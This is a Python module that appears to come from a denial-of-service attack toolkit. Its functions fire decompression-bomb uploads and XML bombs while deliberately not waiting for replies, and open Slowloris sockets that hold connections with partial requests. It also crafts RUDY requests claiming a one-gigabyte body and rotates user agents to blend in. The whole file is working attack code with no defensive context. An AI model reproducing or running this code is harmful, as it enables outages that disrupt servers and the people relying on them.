# own libs
from misc.pt_socket import create_socket
from misc.globalfuncs import generate_string, load_user_agents
# external libs
from random import choice
from requests import post
from requests.exceptions import ReadTimeout, RequestException

def post_file_upload(dst_url, filename, payload_bytes, user_agents, accept_lang, content_type="application/zip"):
    try:
        headers = {
            "User-Agent": choice(user_agents),
            "Accept-Language": choice(accept_lang),
            "Connection": "close",
        }
        files = {'file': (filename, payload_bytes, content_type)}
        post(dst_url, files=files, headers=headers, timeout=(3, 0.1))
        return True
    except ReadTimeout:
        return True          # body was sent; we just didn't wait — this is a successful shot
    except RequestException:
        return False


def post_xml_bomb(dst_url, payload_bytes, user_agents, accept_lang, content_type="application/xml"):
    try:
        headers = {
            "User-Agent": choice(user_agents),
            "Accept-Language": choice(accept_lang),
            "Content-Type": content_type,
            "Connection": "close",
        }
        post(dst_url, data=payload_bytes, headers=headers, timeout=(3, 0.1))
        return True
    except ReadTimeout:
        return True          
    except RequestException:
        return False


def create_slowloris_socket(ip, port, user_agents, accept_lang, attackname):
    """Create new socket with random ua and lang and return it back to sockets_list."""
    sock = create_socket(attackname)
    try:
        sock.connect((ip, port or 80))
        methodpath = f"GET /?{generate_string(4)} HTTP/1.1\r\n"
        user_agent = f"User-Agent: {choice(user_agents)}\r\n"
        acc_lang = f"Accept-language: {choice(accept_lang)}\r\n"
        conn = f"Connection: Keep-Alive\r\n"
        request = methodpath + user_agent + acc_lang + conn
        sock.send(request.encode("UTF-8"))
        return sock
    except Exception as e:
        pass


def rudy_request(url, user_agents):
    """Create rudy request and return encoded request"""
    methodpath = f"POST {url.path} HTTP/1.1\r\n"
    host = f"Host: {url.hostname}\r\n"
    conn = "Connection: Keep-Alive\r\n"
    cont_length = "Content-Length: 1000000000\r\n"
    user_agent = f"User-Agent: {choice(user_agents)}\r\n"
    request = methodpath + host + conn + cont_length + user_agent + "\r\n"
    return request.encode("UTF-8")


def create_request(method_type, hostname, query, path="/", body=""):
    """Create http request with method type, url and body, return encoded request"""
    request = None
    uri = "{}?{}".format(path, query) if query else path
    cont_length = f"Content-Length: {str(len(body))}"
    my_user_agents, my_accept_lang = load_user_agents()
    user_agent = f"User-Agent: {choice(my_user_agents)}"
    acc_lang = f"Accept-language: {choice(my_accept_lang)}"

    match method_type:
        case "GET":
            headers = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
            request = "GET " + uri + " HTTP/1.1\r\nHost: " + hostname + "\r\n" + user_agent + "\r\n" + headers + "\r\n" + acc_lang + "\r\n\r\n"
        case "POST":
            headers = "Content-Type:application/json"
            request = "POST " + uri + " HTTP/1.1\r\nHost: " + hostname + "\r\n" + user_agent + "\r\n" + cont_length + "\r\n" + headers + "\r\n\r\n" + body
        case "HEAD":
            headers = "Accept:text/html"
            request = "HEAD " + uri + " HTTP/1.1\r\nHost: " + hostname + "\r\n" + user_agent + "\r\n" + headers + "\r\n\r\n"
    return request.encode("UTF-8")
